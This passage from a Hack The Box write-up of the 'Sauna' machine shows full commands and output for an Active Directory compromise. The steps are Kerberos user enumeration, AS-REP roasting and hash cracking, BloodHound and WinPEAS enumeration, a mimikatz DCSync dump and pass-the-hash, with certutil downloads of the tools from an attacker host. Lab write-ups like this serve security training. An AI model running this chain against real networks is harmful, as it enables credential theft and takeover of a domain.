</pre></table></code></div></div><p>I ran the script and outputted the results in a file called <code class="language-plaintext highlighter-rouge">users.txt</code>. To brute force to the users that exist on the system, I will be using <a href="https://github.com/TarlogicSecurity/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python kerbrute.py <span class="nt">-users</span> ../users.txt <span class="nt">-domain</span> EGOTISTICAL-BANK.LOCAL <span class="nt">-t</span> 10
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Valid user <span class="o">=&gt;</span> fsmith <span class="o">[</span>NOT PREAUTH]
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Valid user <span class="o">=&gt;</span> hsmith
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No passwords were discovered :<span class="s1">'(
</span></pre></table></code></div></div><p>We found 2 users, one of which, being <code class="language-plaintext highlighter-rouge">fsmith</code>, do not have Kerberos Pre-authentication enabled! This means it can be a target for <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack, allowing us to get a AS-REP hash, which can be cracked to retrieve his password! More information about Kerberos-related attacks can be found in this <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">article</a>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python GetNPUsers.py egotistical-bank.local/fsmith <span class="nt">-no-pass</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> hashes.asreproast <span class="nt">-no-pass</span>
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>fsmith
<span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1<span class="nv">$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e</span>
</pre></table></code></div></div><p>Next, we proceed to crack it with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>hashcat <span class="nt">-m</span> 18200 <span class="nt">--force</span> <span class="nt">-a</span> 0 hash.asreproast /usr/share/wordlists/rockyou.txt
...
<span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1<span class="nv">$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e</span>:Thestrokes23
...
</pre></table></code></div></div><p>With the password <code class="language-plaintext highlighter-rouge">Thestrokes23</code>, we can login into the box. But how ?</p><h1 id="reconnaissance-2">Reconnaissance (2)</h1><p>I did a second round of scanning, but this time with all ports from 1 to 65535.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-p</span> 1-65535 EGOTISTICAL-BANK.LOCAL
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-03-14 09:44 EDT
Nmap scan report <span class="k">for </span>sauna.htb <span class="o">(</span>10.10.10.175<span class="o">)</span>
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
63004/tcp open  unknown
</pre></table></code></div></div><p>We can use the <code class="language-plaintext highlighter-rouge">WinRM</code> service on port <code class="language-plaintext highlighter-rouge">5985</code> to login into the box! I will be using <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to do so.</p><h1 id="usertxt">user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>ruby evil-winrm.rb <span class="nt">-i</span> egotistical-bank.local <span class="nt">-u</span> fsmith <span class="nt">-p</span> Thestrokes23
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
1b55XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>With a shell now, we can enumerate the Active Directory environment using <a href="https://github.com/BloodHoundAD/BloodHound"><code class="language-plaintext highlighter-rouge">BloodHound</code></a>.</p><p>First we upload <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1"><code class="language-plaintext highlighter-rouge">SharpHound.ps1</code></a> to the box.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/SharpHound.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
</pre></table></code></div></div><p>And then import it and run <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain egotistical-bank.local -LDAPUser FSmith -LDAPPass Thestrokes23
</pre></table></code></div></div><p>Fortunately, <code class="language-plaintext highlighter-rouge">evil-winrm</code> supports a download feature so we can use it to retrieve the results.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; download 20200719092606_BloodHound.zip /root/Desktop/sauna/20200719092606_BloodHound.zip
Info: Downloading C:\Users\FSmith\Documents\20200719092606_BloodHound.zip to /root/Desktop/sauna/20200719092606_BloodHound.zip

                                                             
Info: Download successful!
</pre></table></code></div></div><p>Now we start the <a href="https://github.com/belane/docker-bloodhound"><code class="language-plaintext highlighter-rouge">docker-bloodhound</code></a> container and upload our results.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="se">\</span>
  <span class="nt">-p</span> 7474:7474 <span class="se">\</span>
  <span class="nt">-e</span> <span class="nv">DISPLAY</span><span class="o">=</span>unix<span class="nv">$DISPLAY</span> <span class="se">\</span>
  <span class="nt">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="se">\</span>
  <span class="nt">--device</span><span class="o">=</span>/dev/dri:/dev/dri <span class="se">\</span>
  <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/data:/data <span class="se">\</span>
  <span class="nt">--name</span> bloodhound belane/bloodhound
<span class="nv">$ </span><span class="nb">mv </span>20200719092606_BloodHound.zip <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/data
</pre></table></code></div></div><p>After uploading the data, I tried different queries and the query, <code class="language-plaintext highlighter-rouge">Find Principals with DCSync Rights</code>, shows a possible path.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sauna3.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">svc-loanmgr</code> has <code class="language-plaintext highlighter-rouge">DCSync</code> rights, meaning we can use that account to retrieve the credentials of any domain user, including the Administrator! But the question is, how?</p><p>Lets upload <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"><code class="language-plaintext highlighter-rouge">WinPEAS</code></a> and run it to see if we can find anything to help us!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; certutil -f -split -urlcache http://10.10.XX/winPEASx64.exe
****  Online  ****
  000000  ...
  037c00
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; .\winPEASx64.exe
...
  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
...
</pre></table></code></div></div><p>We found the password for <code class="language-plaintext highlighter-rouge">svc_loanmanager</code>, which is probably referring to <code class="language-plaintext highlighter-rouge">svc_loanmgr</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby evil-winrm.rb <span class="nt">-i</span> egotistical-bank.local <span class="nt">-u</span> svc_loanmgr <span class="nt">-p</span> Moneymakestheworldgoround!
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_loanmgr<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>egotisticalbank<span class="se">\s</span>vc_loanmgr
</pre></table></code></div></div><h1 id="exploitation">Exploitation</h1><p>As <code class="language-plaintext highlighter-rouge">svc_loanmgr</code>, we can now perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack with <code class="language-plaintext highlighter-rouge">mimikatz.exe</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; .\mimikatz "lsadump::dcsync /domain:egotistical-bank.local /user:Administrator" "exit"
[DC] 'egotistical-bank.local' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>With the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of <code class="language-plaintext highlighter-rouge">Administrator</code>, we can <code class="language-plaintext highlighter-rouge">psexec</code> directly into the box!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>python psexec.py Administrator@egotistical-bank.local <span class="nt">-hashes</span> :d9485863c1e9e05851aa40cbb4ab9dff
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.175.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file VMlklPxX.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.175.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service xbmD on 10.10.10.175.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service xbmD.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.973]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;more C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
f3eeXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Sauna - rizemon's blog&url=https://rizemon.github.io/posts/sauna-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Sauna - rizemon's blog&u=https://rizemon.github.io/posts/sauna-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Sauna - rizemon's blog&url=https://rizemon.github.io/posts/sauna-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/forest-htb/"><div class="card-body"> <span class="timeago small" > Mar 22, 2020 <i class="unloaded">2020-03-22T08:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Forest</h3><div class="text-muted small"><p> This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience! Configuration Th...</p></div></div></a></div><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/heist-htb/"><div class="card-body"> <span class="timeago small" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Heist</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/book-htb/" class="btn btn-outline-primary"><p>Hack The Box - Book</p></a> <a href="/posts/cascade-htb/" class="btn btn-outline-primary"><p>Hack The Box - Cascade</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
